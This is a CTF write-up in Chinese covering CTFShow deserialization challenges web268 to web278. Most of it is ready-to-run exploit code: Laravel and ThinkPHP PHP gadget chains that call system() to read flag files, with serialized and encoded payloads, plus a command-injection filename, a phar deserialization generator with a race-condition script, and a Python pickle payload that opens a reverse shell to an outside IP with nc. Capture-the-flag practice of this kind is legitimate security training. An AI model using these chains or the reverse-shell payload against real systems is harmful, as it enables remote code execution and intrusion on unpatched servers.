蚁剑连接即可。

![](F:/CTFShow-Web/Web入门/反序列化/图片/web268.png)

![](F:/CTFShow-Web/Web入门/反序列化/图片/web269.png)

![](F:/CTFShow-Web/Web入门/反序列化/图片/web270.png)

你们仨一个个咋的？



### web271

#### LARAVEL反序列化漏洞

exp:

```
<?php
namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        protected $command;
        protected $parameters;
        protected $app;
        public $test;
        public function __construct($command, $parameters,$class,$app){
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test=$class;
            $this->app=$app;
        }
    }
}
namespace Illuminate\Auth{
    class GenericUser{
        protected $attributes;
        public function __construct(array $attributes){
            $this->attributes = $attributes;
        }
    }
}
namespace Illuminate\Foundation{
    class Application{
        protected $hasBeenBootstrapped = false;
        protected $bindings;
        public function __construct($bind){
            $this->bindings=$bind;
        }
    }
}
namespace{
    $genericuser = new Illuminate\Auth\GenericUser(
        array(
            "expectedOutput"=>array("0"=>"1"),
            "expectedQuestions"=>array("0"=>"1")
        )
    );
    $application = new Illuminate\Foundation\Application(
        array(
            "Illuminate\Contracts\Console\Kernel"=>
                array(
                    "concrete"=>"Illuminate\Foundation\Application"
                )
        )
    );
    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
        "system",array('tac /f*'),
        $genericuser,
        $application
    );
    echo urlencode(serialize($pendingcommand));
}
# O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22tac+%2Ff%2A%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D

```



### web272-273

还有高手？

```
<?php
namespace Illuminate\Broadcasting{

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct(){
            $this->events=new Dispatcher();
            $this->event=new QueuedCommand();
        }
    }
}
namespace Illuminate\Foundation\Console{
    class QueuedCommand
    {
        public $connection="cat /flag";
    }
}
namespace Illuminate\Bus{
    class Dispatcher
    {
        protected $queueResolver="system";

    }
}
namespace{

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
}

#O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D


```

![](F:/CTFShow-Web/Web入门/反序列化/图片/web272.png)

![](F:/CTFShow-Web/Web入门/反序列化/图片/web273.png)



### web274

#### thinkphp反序列化漏洞

反序列化链是从 `__destruct()` 开始

<!-- @unserialize(base64_decode(\$_GET['data']))-->

exp:

```
<?php
namespace think\process\pipes{

    use think\model\Pivot;

    class Windows
    {
        private $files = [];
        public function __construct(){
            $this->files[]=new Pivot();
        }
    }
}
namespace think{
    abstract class Model
    {
        protected $append = [];
        private $data = [];
        public function __construct(){
            $this->data=array(
              'feng'=>new Request()
            );
            $this->append=array(
                'feng'=>array(
                    'hello'=>'world'
                )
            );
        }
    }
}
namespace think\model{

    use think\Model;

    class Pivot extends Model
    {

    }
}
namespace think{
    class Request
    {
        protected $hook = [];
        protected $filter;
        protected $config = [
            // 表单请求类型伪装变量
            'var_method'       => '_method',
            // 表单ajax伪装变量
            'var_ajax'         => '',
            // 表单pjax伪装变量
            'var_pjax'         => '_pjax',
            // PATHINFO变量名 用于兼容模式
            'var_pathinfo'     => 's',
            // 兼容PATH_INFO获取
            'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
            // 默认全局过滤方法 用逗号分隔多个
            'default_filter'   => '',
            // 域名根，如thinkphp.cn
            'url_domain_root'  => '',
            // HTTPS代理标识
            'https_agent_name' => '',
            // IP代理获取标识
            'http_agent_ip'    => 'HTTP_X_REAL_IP',
            // URL伪静态后缀
            'url_html_suffix'  => 'html',
        ];
        public function __construct(){
            $this->hook['visible']=[$this,'isAjax'];
            $this->filter="system";
        }
    }
}
namespace{

    use think\process\pipes\Windows;

    echo base64_encode(serialize(new Windows()));
}
#TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJmZW5nIjthOjE6e3M6NToiaGVsbG8iO3M6NToid29ybGQiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJmZW5nIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjg7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTA6e3M6MTA6InZhcl9tZXRob2QiO3M6NzoiX21ldGhvZCI7czo4OiJ2YXJfYWpheCI7czowOiIiO3M6ODoidmFyX3BqYXgiO3M6NToiX3BqYXgiO3M6MTI6InZhcl9wYXRoaW5mbyI7czoxOiJzIjtzOjE0OiJwYXRoaW5mb19mZXRjaCI7YTozOntpOjA7czoxNDoiT1JJR19QQVRIX0lORk8iO2k6MTtzOjE4OiJSRURJUkVDVF9QQVRIX0lORk8iO2k6MjtzOjEyOiJSRURJUkVDVF9VUkwiO31zOjE0OiJkZWZhdWx0X2ZpbHRlciI7czowOiIiO3M6MTU6InVybF9kb21haW5fcm9vdCI7czowOiIiO3M6MTY6Imh0dHBzX2FnZW50X25hbWUiO3M6MDoiIjtzOjEzOiJodHRwX2FnZW50X2lwIjtzOjE0OiJIVFRQX1hfUkVBTF9JUCI7czoxNToidXJsX2h0bWxfc3VmZml4IjtzOjQ6Imh0bWwiO319fX19fQ==


```

data先传入exp然后多加一个变量补上需要的执行命令

payload:

```
?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJmZW5nIjthOjE6e3M6NToiaGVsbG8iO3M6NToid29ybGQiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJmZW5nIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjg7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTA6e3M6MTA6InZhcl9tZXRob2QiO3M6NzoiX21ldGhvZCI7czo4OiJ2YXJfYWpheCI7czowOiIiO3M6ODoidmFyX3BqYXgiO3M6NToiX3BqYXgiO3M6MTI6InZhcl9wYXRoaW5mbyI7czoxOiJzIjtzOjE0OiJwYXRoaW5mb19mZXRjaCI7YTozOntpOjA7czoxNDoiT1JJR19QQVRIX0lORk8iO2k6MTtzOjE4OiJSRURJUkVDVF9QQVRIX0lORk8iO2k6MjtzOjEyOiJSRURJUkVDVF9VUkwiO31zOjE0OiJkZWZhdWx0X2ZpbHRlciI7czowOiIiO3M6MTU6InVybF9kb21haW5fcm9vdCI7czowOiIiO3M6MTY6Imh0dHBzX2FnZW50X25hbWUiO3M6MDoiIjtzOjEzOiJodHRwX2FnZW50X2lwIjtzOjE0OiJIVFRQX1hfUkVBTF9JUCI7czoxNToidXJsX2h0bWxfc3VmZml4IjtzOjQ6Imh0bWwiO319fX19fQ==&system=cat /flag
```

![](F:/CTFShow-Web/Web入门/反序列化/图片/web274.png)

### web275

```
<?php

/*
# -*- coding: utf-8 -*-
  Author: h1xa
  Date:   2020-12-08 19:13:36
  Last Modified by:   h1xa
  Last Modified time: 2020-12-08 20:08:07
  email: h1xa@ctfer.com
  link: https://ctfer.com

*/


highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){#检查有没有php或者..
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){#这里直接可以执行命令啊
        if($this->evilfile){
            system('rm '.$this->filename);
        }
    }
}
if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }
    
}else{
    echo 'where is flag?';
}

where is flag?

```

什么东西？意义不明。

payload:

```
GET: ?fn=a||nl+f*
POST: flag
```

看到1就说明成功了。

接下来，ctrl+u

![](F:/CTFShow-Web/Web入门/反序列化/图片/web275.png)

### web276

#### phar反序列化

phar文件本质是一种压缩文件,会以序列化的形式存储用户定义的meta-data.当受影响的文件操作函数调用phar文件时,会自动反序列化meta-data内的内容

#### 什么是phar文件

在软件中,PHAR(PHP归档)文件是一种打包格式,通过将许多php代码文件和其他资源(如图像 样式表等)捆绑到一个归档文件中来实现应用程序和库的分发.

php通过用户定义的内置的"流包装器"实现复杂的文件处理功能.内置包装器可以用于文件操作系统函数,如[fopen(),copy(),file_exists()和filesize().phar://就是一种内置的流包装器

#### php中一些常见的流包装器

file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流

#### phar文件的结构

stub:phar文件的标志,必须以 xxx __HALT_COMPILER();?>结尾,否则无法识别.xxx可为自定义内容
manifest:phar 文件本质上是一种压缩文件,其中每个被压缩的文件的权限 属性等信息被放在这个部分.这个部分还会以序列化的形式存储用户自定义的meta-data,这是漏洞利用最核心的地方
content:被压缩文件的内容
signature (可空):签名,放在末尾
生成一个phar文件

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new Test();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();

#### 利用条件

phar文件要能够上传到服务器端
要有可用的魔术方法作为跳板
文件操作函数的参数可控,且: / phar等特殊字符没有被过滤

先生成phar.phar

```
<?php
    unlink('phar.phar');
    class filter{
        public $filename;
        public $filecontent;
        public $evilfile = true;
        public $admin = true;

        public function __construct($f='',$fn=''){
            $this->filename='1;tac fl?g.ph?';
            $this->filecontent='';
        }

    }
 
    $phar = new Phar('phar.phar');
    $phar->startBuffering();
    $phar->setStub('<?php __HALT_COMPILER();?>');
    $o=new filter();
    $phar->setMetadata($o);
    $phar->addFromString('test.txt','test');
    $phar->stopBuffering();
?>
```

再进行条件竞争

```
import requests
import time
import threading


success = False
def getPhar(phar):
    with open(phar,'rb') as p:
        return p.read()


def writePhar(url,data):
    print('writing...')
    requests.post(url,data)
    
def unlinkPhar(url,data):
    print('unlinking...')
    global success
    res = requests.post(url,data)
    if 'ctfshow{' in res.text and success is False:
        print(res.text)
        success = True
        
def main():
    global success
    url = 'http://d5fc2eb4-2fe7-4ce5-961f-6de31f014278.challenge.ctf.show/'
    phar = getPhar('phar.phar')
    while success is False:
        time.sleep(1)
        w = threading.Thread(target=writePhar,args=(url+'?fn=p.phar',phar))
        s = threading.Thread(target=unlinkPhar,args=(url+'?fn=phar://p.phar/test',''))
        w.start()
        s.start()
        
if __name__ == '__main__':
    main()
    
```

等十一点半检验

### web277-278

#### flask反序列化

<!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) -->

python完全面向对象

```
import base64
import pickle


class shell(object):
    def __reduce__(self):
        return (eval, ("__import__('os').system('nc 124.223.158.81 9000 -e /bin/sh').read()",))

k = shell()
print(base64.b64encode(pickle.dumps(k)))


```

payload:

```
/backdoor?data=gASVXgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxCX19pbXBvcnRfXygnb3MnKS5wb3BlbignbmMgMTI0LjIyMy4xNTguODEgOTAwMCAtZSAvYmluL3NoJykucmVhZCgplIWUUpQu
```

得去开台服务器了。

AK！